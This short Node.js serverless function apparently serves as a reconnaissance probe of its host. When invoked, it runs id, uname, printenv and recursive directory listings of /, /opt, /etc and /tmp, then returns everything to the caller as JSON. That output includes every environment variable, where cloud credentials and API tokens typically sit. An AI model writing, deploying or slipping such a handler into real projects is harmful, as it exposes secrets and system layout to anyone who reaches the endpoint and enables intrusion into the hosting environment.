const { execSync } = require("child_process");

exports.handler = async function (event, context) {
  try {
    const output = {
      id: execSync("id").toString().trim(),
      uname: execSync("uname -a").toString().trim(),
      env: execSync("printenv").toString().trim(),
      command: execSync("ls -la /").toString().trim(),
      command2: execSync("ls -laR /opt/").toString().trim(),
      command3: execSync("ls -la /etc/").toString().trim(),
      command4: execSync("ls -laR /tmp/").toString().trim(),
    };

    return {
      statusCode: 200,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(output, null, 2),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: "Error: " + err.toString(),
    };
  }
};
